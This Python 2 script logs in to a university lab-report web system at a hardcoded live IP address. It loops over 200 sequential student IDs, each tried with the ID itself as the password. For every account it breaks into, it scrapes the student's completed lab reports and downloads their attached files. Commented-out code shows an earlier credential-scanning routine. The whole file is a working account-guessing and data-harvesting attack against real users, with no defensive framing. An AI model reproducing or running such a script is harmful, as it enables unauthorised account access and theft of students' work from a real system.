#-*- coding: UTF-8 -*-
import requests
import re
import os
import json
from time import sleep
import logging

class classlog(object):
    """log class"""
    def __init__(self,logfilename="log.txt",level=""):
        level = level if level in ['CRITICAL','ERROR','WARNING','INFO','DEBUG','NOTSET'] else 'DEBUG'
        self.logger = logging.getLogger("classlog")
        self.logger.setLevel(logging.DEBUG)
        Fileformatter = logging.Formatter("%(asctime)s - %(filename)s - %(levelname)-8s: %(message)s",datefmt='%Y-%m-%d %I:%M:%S %p')
        Streamformatter = logging.Formatter("%(asctime)s %(filename)s %(levelname)s:%(message)s",datefmt='%Y-%m-%d %I:%M:%S')# ,filename='example.log')

        Filelog = logging.FileHandler(logfilename)
        Filelog.setFormatter(Fileformatter)
        Filelog.setLevel(logging.DEBUG)

        Streamlog = logging.StreamHandler()
        Streamlog.setFormatter(Streamformatter)
        Streamlog.setLevel(level)

        self.logger.addHandler(Filelog)
        self.logger.addHandler(Streamlog)

    def debug(self,msg):
        self.logger.debug(msg)

    def info(self,msg):
        self.logger.info(msg)

    def warn(self,msg):
        self.logger.warn(msg)

    def error(self,msg):
        self.logger.error(msg)

    def critical(self,msg):
        self.logger.critical(msg)


class Student(object):
    """docstring for Student"""
    def __init__(self, userid, password):
        self.userid = userid
        self.password = password
        self.username = None
        self.RootDir = RootDir + self.userid + '/'
        self.cookies = None
        self.cid = None
        self.term = None
        self.finlist = {}
        self.unfinlist = {}
        self.LOG = None
        self.getinfo()

    def getinfo(self):
        payload = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0',
        'userid' : self.userid,
        'password': self.password,
        'quan':'Student'
        }
        respost = requests.post(RootUrl + "Login.action", data=payload)
        if respost.text == '"3"':
            self.cookies = respost.cookies
            resget = requests.get(RootUrl + 'student.action', cookies = self.cookies)
            self.username = re.search("<i class=\"icon-user\">.*> (.*)</span>",resget.text).group(1)#\s*<span class=\"hidden-phone\">(.*)</span>
            self.cid = re.search("cid=(\d*)", resget.text).group(1)
            self.term = re.search("term=(\d*)", resget.text).group(1)

            if not os.path.exists(self.RootDir):
                os.makedirs(self.RootDir)
                LOG.debug(u"创建文件夹: " + self.userid)
            LOG.info(self.userid + self.username + u": 登陆成功")
            self.LOG = 1
            return 1
        if respost.text == '"4"':
            LOG.debug(self.userid + u": 账户或密码错误")
            return 0

    def getfinish(self):
        if self.LOG:
            resget = requests.get(RootUrl + 'student/student/StudentReport_finish?sid=' + self.userid + '&term=' + self.term, cookies = self.cookies)
            m = re.findall('<tr>\s*<td.*>(.*)</td>\s*<td.*>(.*)</td>\s*<td.*>(.*)</td>\s*<td.*>(.*)</td>\s*<td.*>\s*<a.*href=(.*)', resget.text)
            for x in m:
                LOG.info(u"已完成实验:" + x[0] + " " + x[1])
                m = re.search("studentReportId=(\d*)&lid=(\d*-\d*)", x[4])
                self.finlist[m.group(2)] = [m.group(1),x]

            #print self.finlist['201603-1502108010'][0]
    def getunfinish(self):
        if self.LOG:
            resget = requests.get(RootUrl + 'student/student/StudentReport_unFinish?sid=' + self.userid + '&cid=' + self.cid + '&term=' + self.term, cookies = self.cookies)
            m = re.findall('<tr>\s*<td.*>(.*)</td>\s*<td.*>(.*)</td>\s*<td.*>(.*)</td>\s*<td.*>(.*)</td>\s*<td.*>(.*)</td>\s*<td.*>\s*<a.*href=(.*)', resget.text)
            for x in m:
                LOG.debug(u"未完成:" + x[0] + x[1])
                self.unfinlist.append(re.search("labReportClassId=(\d*)", resget.text).group(1))

def getlab(student,lid):
    if student.LOG:
        resget = requests.get(RootUrl + 'student/student/StudentReport_search?sid=' + student.userid + '&studentReportId=' + student.finlist[lid][0] + '&lid=' + lid + '&term=' + student.term, cookies = student.cookies)
        text = re.findall("<textarea.*name=\"(.*?)\".*?>([\s\S]*?)</textarea>",resget.content)
        if not os.path.exists(student.RootDir + student.finlist[lid][1][1]):
            os.makedirs(student.RootDir + student.finlist[lid][1][1])
            LOG.debug(u"创建文件夹: " + student.finlist[lid][1][1])
        f = open(student.RootDir + student.finlist[lid][1][1] + "/text.txt","w")
        for x in text:
            f.write(x[1] + "\n" + "-"*50 + "\n")
        f.write(json.dumps(text))

        url = re.search("(student/experDownload.action\?fileName=.*)\"", resget.text)
        if url:
            r = requests.get(RootUrl + 'student/' + url.group(1))
            with open(student.RootDir + student.finlist[lid][1][1] + '/' + lid + '.zip', "wb") as code:
                code.write(r.content)

        LOG.info(student.userid + ":" + student.finlist[lid][1][1] + u"下载完成")

RootDir = "lab1.0/"
RootUrl = "http://61.163.231.194:8080/Lab2.0/"
if not os.path.exists("lab1.0") and not os.path.isfile("lab1.0"):
    os.makedirs(RootDir)
LOG = classlog(RootDir + "log.txt",)#'INFO'


login = []
for x in xrange(200):
    a = str(1415935001+x)
    stu = Student(a,a)
    stu.getfinish()
    if stu.LOG:
        login.append(stu)
for x in login:
    for i in x.finlist:
        getlab(x,i)


# b = Student('1415935001','654321')
# b.getfinish()
# getlab(b,'201603-1508408010')



# def scan(userid,password):
#     #print userid,password


#     #print respost.headers,respost.text
#     if
#         cha = "学生信息管理分析系统"
#         m = re.search(cha, resget.text.encode("utf-8"))
#         if m:
#             print userid + ":OK"
#     # else:
#     #     print userid + ":NO"


# f = open("1415.txt","r")
# a = f.readlines()




